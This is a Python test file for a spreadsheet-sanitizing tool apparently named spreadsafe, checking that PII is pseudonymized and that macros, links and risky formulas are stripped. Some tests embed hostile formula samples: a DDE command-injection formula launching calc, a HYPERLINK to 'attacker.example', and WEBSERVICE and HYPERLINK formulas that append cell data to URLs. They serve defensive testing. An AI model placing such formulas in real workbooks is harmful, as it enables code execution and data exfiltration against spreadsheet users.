from contextlib import redirect_stderr, redirect_stdout
from dataclasses import dataclass
from datetime import date, datetime
from io import StringIO
from pathlib import Path
import json
import shutil
import zipfile

from openpyxl.chart import BarChart, Reference
from openpyxl import Workbook, load_workbook
from openpyxl.comments import Comment
from openpyxl.packaging.custom import StringProperty
from openpyxl.worksheet.table import Table
from openpyxl.workbook.defined_name import DefinedName
from openpyxl.worksheet.datavalidation import DataValidation
import pytest

from spreadsafe import cli as cli_module
from spreadsafe.cli import main as cli_main, package_directory
from spreadsafe.detectors import Config, load_config
from spreadsafe.mapping import PseudonymMapper
from spreadsafe.sanitizer import Sanitizer, _parse_decimal
from spreadsafe.validators import ValidationResult, _is_safe_generated_value, validate_output


@dataclass(frozen=True)
class CliResult:
    exit_code: int
    stdout: str
    stderr: str


def invoke_cli(args: list[str]) -> CliResult:
    stdout = StringIO()
    stderr = StringIO()
    try:
        with redirect_stdout(stdout), redirect_stderr(stderr):
            exit_code = cli_main(args)
    except SystemExit as exc:
        exit_code = exc.code if isinstance(exc.code, int) else 1
    return CliResult(exit_code, stdout.getvalue(), stderr.getvalue())


def make_workbook(path: Path) -> None:
    workbook = Workbook()
    orders = workbook.active
    orders.title = "Orders"
    orders.append(["Order ID", "Client Name", "Email", "Amount", "Status", "Notes", "Total"])
    orders.append(
        [
            "ORD-001",
            "ACME Sp. z o.o.",
            "jan@example.com",
            14832.72,
            "PAID",
            "Client called from +48 600 123 456 about FV/2025/331",
            "=D2*1.23",
        ]
    )
    hidden = workbook.create_sheet("Internal")
    hidden.sheet_state = "hidden"
    hidden["A1"] = "PESEL"
    hidden["A2"] = "44051401359"
    workbook.save(path)


def test_package_creates_sanitized_files_reports_and_redacts_formulas(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (input_dir / "clients.csv").write_text(
        "Client Name,Email,Status,Notes\n"
        "ACME Sp. z o.o.,jan@example.com,ACTIVE,Call +48 600 123 456\n",
        encoding="utf-8",
    )

    package_directory(input_dir, output_dir)

    sanitized_xlsx = output_dir / "sanitized" / "orders.xlsx"
    sanitized_csv = output_dir / "sanitized" / "clients.csv"
    assert sanitized_xlsx.exists()
    assert sanitized_csv.exists()
    assert (output_dir / "reports" / "workbook-report.md").exists()
    assert (output_dir / "reports" / "workbook-report.json").exists()
    assert (output_dir / "reports" / "risk-report.md").exists()
    assert not (output_dir / "state").exists()
    report_json = json.loads((output_dir / "reports" / "workbook-report.json").read_text(encoding="utf-8"))
    report_paths = {item["path"] for item in report_json}
    assert report_paths == {"sanitized/clients.csv", "sanitized/orders.xlsx"}
    assert str(output_dir) not in json.dumps(report_json)

    workbook = load_workbook(sanitized_xlsx, data_only=False)
    row = next(workbook["Orders"].iter_rows(min_row=2, max_row=2, values_only=True))
    assert row[1] == "SPREADSAFE_COMPANY_0002"
    assert row[2] == "SPREADSAFE_EMAIL_0001"
    assert row[4] == "PAID"
    assert row[5] == "[REDACTED_TEXT]"
    assert row[6] == "[REDACTED_FORMULA]"
    assert workbook["Internal"].sheet_state == "hidden"
    assert workbook["Internal"]["A2"].value == "SPREADSAFE_PESEL_0002"
    for sheet in workbook.worksheets:
        for cells in sheet.iter_rows(values_only=True):
            assert "44051401359" not in {str(value) for value in cells if value is not None}

    shareable_text = "\n".join(
        file.read_text(encoding="utf-8", errors="ignore")
        for folder in ["sanitized", "reports"]
        for file in (output_dir / folder).rglob("*")
        if file.suffix != ".xlsx"
    )
    assert "jan@example.com" not in shareable_text
    assert "+48 600 123 456" not in shareable_text
    assert "ACME Sp. z o.o." not in shareable_text
    assert "Client Name" not in shareable_text

    result = validate_output(output_dir)
    assert result.passed


def test_validation_fails_when_obvious_pii_remains(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "leak.csv").write_text("email\njan@example.com\n", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("leak.csv: row 2 column 1 EMAIL remains" in issue for issue in result.issues)
    assert all("jan@example.com" not in issue for issue in result.issues)


def test_validate_command_returns_failure_exit_code_for_leaks(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "leak.csv").write_text("email\njan@example.com\n", encoding="utf-8")
    result = invoke_cli(["validate", str(output_dir)])

    assert result.exit_code == 1
    assert "leak.csv: row 2 column 1 EMAIL remains" in result.stderr
    assert "jan@example.com" not in result.stderr


def test_validate_function_returns_failure_code_for_leaks(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "leak.csv").write_text("email\njan@example.com\n", encoding="utf-8")

    assert cli_module.validate(output_dir) == 1


def test_validate_command_reports_success_for_clean_package(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    result = invoke_cli(["validate", str(output_dir)])

    assert result.exit_code == 0
    assert "Validation passed" in result.stdout


def test_cli_help_lists_commands() -> None:
    result = invoke_cli(["--help"])

    assert result.exit_code == 0
    for command in ("scan", "sanitize", "validate", "package"):
        assert command in result.stdout


def test_scan_command_writes_reports_without_package_outputs(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "scan-output"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")

    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    assert (output_dir / "reports" / "workbook-report.md").exists()
    assert not (output_dir / "sanitized").exists()
    assert not (output_dir / ".spreadsafe-package").exists()


def test_scan_command_removes_stale_package_outputs(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    assert invoke_cli(["package", str(input_dir), "--out", str(output_dir)]).exit_code == 0

    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 0
    assert (output_dir / "reports" / "workbook-report.md").exists()
    assert not (output_dir / "sanitized").exists()
    assert not (output_dir / ".spreadsafe-package").exists()


def test_scan_command_rejects_sensitive_existing_output_gitignore(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "scan-output"
    input_dir.mkdir()
    output_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (output_dir / ".gitignore").write_text("jan@example.com\n", encoding="utf-8")

    result = invoke_cli(["scan", str(input_dir), "--out", str(output_dir)])

    assert result.exit_code == 2
    assert "Existing output .gitignore contains sensitive data" in result.stderr
    assert (output_dir / ".gitignore").read_text(encoding="utf-8") == "jan@example.com\n"


def test_validate_command_applies_config_file(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    config_path = tmp_path / "spreadsafe.yml"
    config_path.write_text("sensitive_columns:\n  - Internal ID\n", encoding="utf-8")
    (sanitized_dir / "internal.csv").write_text("Internal ID\ncustomer-17\n", encoding="utf-8")
    result = invoke_cli(["validate", str(output_dir), "--config", str(config_path)])

    assert result.exit_code == 1
    assert "configured sensitive value remains" in result.stderr


def test_existing_output_gitignore_is_preserved_without_state_directory(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    output_dir.mkdir()
    (output_dir / ".gitignore").write_text("reports/tmp/\n", encoding="utf-8")
    make_workbook(input_dir / "orders.xlsx")

    package_directory(input_dir, output_dir)

    gitignore_lines = (output_dir / ".gitignore").read_text(encoding="utf-8").splitlines()
    assert gitignore_lines == ["reports/tmp/"]
    assert not (output_dir / "state").exists()


def test_package_rejects_sensitive_existing_output_gitignore(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    output_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (output_dir / ".gitignore").write_text("jan@example.com\n", encoding="utf-8")

    with pytest.raises(ValueError, match="Existing output .gitignore contains sensitive data"):
        package_directory(input_dir, output_dir)


def test_package_rejects_existing_output_gitignore_directory(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    output_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (output_dir / ".gitignore").mkdir()

    with pytest.raises(ValueError, match="Existing output .gitignore is not a file"):
        package_directory(input_dir, output_dir)


def test_package_removes_xlsx_comments_and_hyperlinks(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["Client Name", "Website", "Notes"])
    sheet.append(["ACME Sp. z o.o.", "Portal", "OK"])
    sheet["B2"].hyperlink = "https://example.invalid/customer/jan@example.com"
    sheet["B2"].comment = Comment("PESEL 44051401359 for jan@example.com", "operator")
    workbook.save(input_dir / "orders.xlsx")

    package_directory(input_dir, output_dir)

    sanitized = load_workbook(output_dir / "sanitized" / "orders.xlsx", data_only=False)
    assert sanitized["Orders"]["B2"].hyperlink is None
    assert sanitized["Orders"]["B2"].comment is None
    assert validate_output(output_dir).passed


def test_sanitize_xlsx_failure_does_not_leave_original_destination(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source = tmp_path / "orders.xlsx"
    destination = tmp_path / "sanitized" / "orders.xlsx"
    destination.parent.mkdir()
    make_workbook(source)

    def fail_load_workbook(*_args: object, **_kwargs: object) -> object:
        raise ValueError("boom")

    monkeypatch.setattr("spreadsafe.sanitizer.load_workbook", fail_load_workbook)

    with pytest.raises(ValueError, match="boom"):
        Sanitizer(load_config(None)).sanitize_xlsx(source, destination)

    assert not destination.exists()


def test_package_rejects_output_directory_inside_input_tree(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")

    with pytest.raises(ValueError, match="Output directory cannot be inside input directory"):
        package_directory(input_dir, input_dir / "codex-safe")


def test_package_rejects_input_directory_inside_output_tree_without_deleting_it(
    tmp_path: Path,
) -> None:
    output_dir = tmp_path / "codex-safe"
    input_dir = output_dir / "sanitized"
    input_dir.mkdir(parents=True)
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    workbook_path = input_dir / "orders.xlsx"
    make_workbook(workbook_path)

    with pytest.raises(ValueError, match="Input directory cannot be inside output directory"):
        package_directory(input_dir, output_dir)

    assert workbook_path.exists()


def test_package_rejects_symlinked_generated_output_without_deleting_target(
    tmp_path: Path,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    linked_target = input_dir / "linked"
    input_dir.mkdir()
    linked_target.mkdir()
    workbook_path = linked_target / "orders.xlsx"
    make_workbook(workbook_path)
    output_dir.mkdir()
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    (output_dir / "sanitized").symlink_to(linked_target, target_is_directory=True)

    with pytest.raises(ValueError, match="symlink"):
        package_directory(input_dir, output_dir)

    assert workbook_path.exists()


def test_package_rejects_nested_symlinked_generated_output_without_deleting_target(
    tmp_path: Path,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    external_dir = tmp_path / "external"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    (output_dir / "sanitized").mkdir(parents=True)
    external_dir.mkdir()
    external_file = external_dir / "keep.csv"
    external_file.write_text("status\nSAFE\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").write_text("spreadsafe\n", encoding="utf-8")
    (output_dir / "sanitized" / "link").symlink_to(external_dir, target_is_directory=True)

    with pytest.raises(ValueError, match="symlink"):
        package_directory(input_dir, output_dir)

    assert external_file.exists()


def test_package_rejects_symlinked_package_marker_without_deleting_output(
    tmp_path: Path,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    marker_target = tmp_path / "marker"
    input_dir.mkdir()
    (output_dir / "sanitized").mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    old_file = output_dir / "sanitized" / "old.csv"
    old_file.write_text("status\nOLD\n", encoding="utf-8")
    marker_target.write_text("spreadsafe\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").symlink_to(marker_target)

    with pytest.raises(ValueError, match="package.*symlink|symlink"):
        package_directory(input_dir, output_dir)

    assert old_file.exists()


def test_package_rejects_directory_package_marker_without_deleting_output(
    tmp_path: Path,
) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    (output_dir / "sanitized").mkdir(parents=True)
    make_workbook(input_dir / "orders.xlsx")
    old_file = output_dir / "sanitized" / "old.csv"
    old_file.write_text("status\nOLD\n", encoding="utf-8")
    (output_dir / ".spreadsafe-package").mkdir()

    with pytest.raises(ValueError, match="package marker is not a file"):
        package_directory(input_dir, output_dir)

    assert old_file.exists()


def test_package_skips_symlinked_input_files(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    external_dir = tmp_path / "external"
    input_dir.mkdir()
    external_dir.mkdir()
    external_csv = external_dir / "secret.csv"
    external_csv.write_text("email\njan@example.com\n", encoding="utf-8")
    (input_dir / "link.csv").symlink_to(external_csv)

    result = package_directory(input_dir, output_dir)

    assert result.passed
    assert not (output_dir / "sanitized" / "link.csv").exists()
    risk_report = (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert "symlinked input path was skipped" in risk_report
    assert "jan@example.com" not in risk_report


def test_package_skips_symlinked_input_directories_with_risk(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    external_dir = tmp_path / "external"
    input_dir.mkdir()
    external_dir.mkdir()
    (external_dir / "secret.csv").write_text("email\njan@example.com\n", encoding="utf-8")
    (input_dir / "linked").symlink_to(external_dir, target_is_directory=True)

    result = package_directory(input_dir, output_dir)

    assert result.passed
    assert list((output_dir / "sanitized").rglob("*")) == []
    risk_report = (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert "symlinked input path was skipped" in risk_report
    assert "jan@example.com" not in risk_report


def test_validate_rejects_reidentification_state_in_package(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    state_dir = output_dir / "state"
    sanitized_dir.mkdir(parents=True)
    state_dir.mkdir()
    (sanitized_dir / "safe.csv").write_text("status\nACTIVE\n", encoding="utf-8")
    (state_dir / "pseudonym-map.key").write_text("key", encoding="utf-8")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("re-identification state" in issue for issue in result.issues)


def test_sanitize_command_reports_nested_output_without_traceback(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    input_dir.mkdir()
    make_workbook(input_dir / "orders.xlsx")
    result = invoke_cli(["sanitize", str(input_dir), "--out", str(input_dir / "out")])

    assert result.exit_code == 2
    assert "Output directory cannot be inside input directory" in result.stderr
    assert "Traceback" not in result.stderr


def test_package_redacts_formula_when_formula_contains_sensitive_literal(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["Total"])
    sheet.append(['=HYPERLINK("mailto:jan@example.com","contact")'])
    workbook.save(input_dir / "orders.xlsx")

    package_directory(input_dir, output_dir)

    sanitized = load_workbook(output_dir / "sanitized" / "orders.xlsx", data_only=False)
    assert sanitized["Orders"]["A2"].value == "[REDACTED_FORMULA]"
    report_text = (output_dir / "reports" / "workbook-report.md").read_text(encoding="utf-8")
    assert "jan@example.com" not in report_text


def test_package_redacts_executable_xlsx_formula_payload(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["=cmd|' /C calc'!A0"])
    workbook.save(input_dir / "formulas.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "formulas.xlsx", data_only=False)
    assert sanitized.active["A2"].value == "[REDACTED_FORMULA]"
    assert validate_output(output_dir).passed


def test_validate_rejects_executable_xlsx_formula_payload(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["=cmd|' /C calc'!A0"])
    workbook.save(sanitized_dir / "formulas.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_package_tokenizes_formula_in_sensitive_column(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["Email"])
    sheet.append(["=LOWER(A1)"])
    workbook.save(input_dir / "formulas.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "formulas.xlsx", data_only=False)
    assert sanitized["Orders"]["A2"].value == "[REDACTED_FORMULA]"
    assert validate_output(output_dir).passed


def test_validate_rejects_formula_in_sensitive_column(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Email"])
    sheet.append(["=LOWER(A1)"])
    workbook.save(sanitized_dir / "formulas.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_validate_rejects_formula_in_configured_sensitive_column(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Internal ID"])
    sheet.append(["=LOWER(A1)"])
    workbook.save(sanitized_dir / "formulas.xlsx")

    result = validate_output(output_dir, Config(sensitive_columns=["Internal ID"]))

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_validate_rejects_configured_sensitive_xlsx_values(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Internal ID"])
    sheet.append(["customer-17"])
    workbook.save(sanitized_dir / "internal.xlsx")

    result = validate_output(output_dir, Config(sensitive_columns=["Internal ID"]))

    assert not result.passed
    assert any("configured sensitive value remains" in issue for issue in result.issues)


def test_package_redacts_external_formula_headers(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active["A1"] = '=HYPERLINK("https://attacker.example","open")'
    workbook.active["A2"] = "SAFE"
    workbook.save(input_dir / "headers.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "headers.xlsx", data_only=False)
    assert sanitized.active["A1"].value == "[REDACTED_FORMULA]"
    assert validate_output(output_dir).passed


def test_package_redacts_url_building_external_formula(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["Status"])
    sheet.append(['=IF(TRUE,HYPERLINK("https"&"://example.test/"&A1,"open"),"")'])
    workbook.save(input_dir / "formulas.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "formulas.xlsx", data_only=False)
    assert sanitized["Orders"]["A2"].value == "[REDACTED_FORMULA]"
    assert validate_output(output_dir).passed


def test_package_redacts_prefixed_external_formula_function(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["Status"])
    sheet.append(['=_xlfn.WEBSERVICE("https"&"://example.test/"&A1)'])
    workbook.save(input_dir / "prefixed-formulas.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "prefixed-formulas.xlsx", data_only=False)
    assert sanitized["Orders"]["A2"].value == "[REDACTED_FORMULA]"
    assert validate_output(output_dir).passed


def test_package_redacts_local_structured_reference_formulas(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Amount", "Total", "Grand Total"])
    sheet.append([100, "=[@Amount]*1.23", "=Table1[[#Totals],[Amount]]"])
    workbook.save(input_dir / "structured.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "structured.xlsx", data_only=False)
    assert sanitized.active["B2"].value == "[REDACTED_FORMULA]"
    assert sanitized.active["C2"].value == "[REDACTED_FORMULA]"
    assert validate_output(output_dir).passed


def test_validate_rejects_nested_external_formula_functions(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(['=IF(TRUE,HYPERLINK("https"&"://example.test/"&A1,"open"),"")'])
    workbook.save(sanitized_dir / "external-function.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_validate_rejects_prefixed_external_formula_functions(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(['=_xlfn.WEBSERVICE("https"&"://example.test/"&A1)'])
    workbook.save(sanitized_dir / "prefixed-external-function.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_package_redacts_external_workbook_formula_references(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["External"])
    sheet.append(["='[prod-budget.xlsx]Sheet1'!A1"])
    workbook.save(input_dir / "external.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "external.xlsx", data_only=False)
    assert sanitized["Orders"]["A2"].value == "[REDACTED_FORMULA]"
    workbook_report = (output_dir / "reports" / "workbook-report.md").read_text(encoding="utf-8")
    risk_report = (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert "prod-budget.xlsx" not in workbook_report
    assert "prod-budget.xlsx" not in risk_report
    assert validate_output(output_dir).passed


def test_package_redacts_path_qualified_external_workbook_formula_references(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "Orders"
    sheet.append(["External"])
    sheet.append(["='C:\\finance\\[prod-budget.xlsx]Sheet1'!A1"])
    workbook.save(input_dir / "external.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized = load_workbook(output_dir / "sanitized" / "external.xlsx", data_only=False)
    assert sanitized["Orders"]["A2"].value == "[REDACTED_FORMULA]"
    workbook_report = (output_dir / "reports" / "workbook-report.md").read_text(encoding="utf-8")
    risk_report = (output_dir / "reports" / "risk-report.md").read_text(encoding="utf-8")
    assert "prod-budget.xlsx" not in workbook_report
    assert "prod-budget.xlsx" not in risk_report
    assert validate_output(output_dir).passed


def test_validate_rejects_external_workbook_formula_references(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["External"])
    workbook.active.append(["='[prod-budget.xlsx]Sheet1'!A1"])
    workbook.save(sanitized_dir / "external.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("formula remains" in issue for issue in result.issues)


def test_package_removes_xlsx_external_link_metadata(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(input_dir / "external-link.xlsx")
    _add_external_link_metadata(input_dir / "external-link.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    sanitized_path = output_dir / "sanitized" / "external-link.xlsx"
    with zipfile.ZipFile(sanitized_path, "r") as workbook_zip:
        names = set(workbook_zip.namelist())
        assert "xl/externalLinks/externalLink1.xml" not in names
        assert "xl/externalLinks/_rels/externalLink1.xml.rels" not in names
        assert b"<externalReferences" not in workbook_zip.read("xl/workbook.xml")
        assert b"externalLink" not in workbook_zip.read("xl/_rels/workbook.xml.rels")
    assert validate_output(output_dir).passed


def test_validate_rejects_xlsx_external_link_metadata(tmp_path: Path) -> None:
    output_dir = tmp_path / "codex-safe"
    sanitized_dir = output_dir / "sanitized"
    sanitized_dir.mkdir(parents=True)
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(sanitized_dir / "external-link.xlsx")
    _add_external_link_metadata(sanitized_dir / "external-link.xlsx")

    result = validate_output(output_dir)

    assert not result.passed
    assert any("external workbook link metadata remains" in issue for issue in result.issues)


def test_package_removes_unsupported_xlsx_payload_parts(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(input_dir / "media.xlsx")
    _add_media_part(input_dir / "media.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    with zipfile.ZipFile(output_dir / "sanitized" / "media.xlsx", "r") as workbook_zip:
        assert "xl/media/image1.txt" not in set(workbook_zip.namelist())
    assert validate_output(output_dir).passed


def test_package_removes_macro_and_activex_xlsx_payload_parts(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    workbook.active.append(["Status"])
    workbook.active.append(["ACTIVE"])
    workbook.save(input_dir / "macro.xlsx")
    _add_macro_and_activex_parts(input_dir / "macro.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    with zipfile.ZipFile(output_dir / "sanitized" / "macro.xlsx", "r") as workbook_zip:
        names = set(workbook_zip.namelist())
        assert "xl/vbaProject.bin" not in names
        assert "xl/activeX/activeX1.bin" not in names
        assert "xl/ctrlProps/ctrlProp1.xml" not in names
        assert b"vbaProject" not in workbook_zip.read("xl/_rels/workbook.xml.rels")
        content_types = workbook_zip.read("[Content_Types].xml")
        assert b"vbaProject" not in content_types
        assert b"activeX" not in content_types
        if "xl/worksheets/_rels/sheet1.xml.rels" in names:
            assert b"activeX" not in workbook_zip.read("xl/worksheets/_rels/sheet1.xml.rels")
    assert validate_output(output_dir).passed


def test_package_removes_xlsx_chart_payload_parts(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Name", "Value"])
    sheet.append(["jan@example.com", 5])
    sheet.append(["SAFE", 3])
    chart = BarChart()
    chart.add_data(Reference(sheet, min_col=2, min_row=1, max_row=3), titles_from_data=True)
    chart.set_categories(Reference(sheet, min_col=1, min_row=2, max_row=3))
    sheet.add_chart(chart, "D1")
    workbook.save(input_dir / "chart.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    with zipfile.ZipFile(output_dir / "sanitized" / "chart.xlsx", "r") as workbook_zip:
        names = set(workbook_zip.namelist())
        assert not any(name.startswith("xl/charts/") for name in names)
        assert not any(name.startswith("xl/drawings/") for name in names)
        sheet_xml = workbook_zip.read("xl/worksheets/sheet1.xml")
        assert b"<drawing" not in sheet_xml
        content_types = workbook_zip.read("[Content_Types].xml")
        assert b"/xl/charts/" not in content_types
        assert b"/xl/drawings/" not in content_types
    assert validate_output(output_dir).passed


def test_package_removes_xlsx_table_metadata_parts(tmp_path: Path) -> None:
    input_dir = tmp_path / "input"
    output_dir = tmp_path / "codex-safe"
    input_dir.mkdir()
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Email", "Status"])
    sheet.append(["jan@example.com", "ACTIVE"])
    sheet.add_table(Table(displayName="Contacts", ref="A1:B2"))
    workbook.save(input_dir / "table.xlsx")

    result = package_directory(input_dir, output_dir)

    assert result.passed
    with zipfile.ZipFile(output_dir / "sanitized" / "table.xlsx", "r") as workbook_zip:
        names = set(workbook_zip.namelist())
        assert not any(name.startswith("xl/tables/") for name in names)
        sheet_xml = workbook_zip.read("xl/worksheets/sheet1.xml")
        assert b"<tableParts" not in sheet_xml
        content_types = workbook_zip.read("[Content_Types].xml")
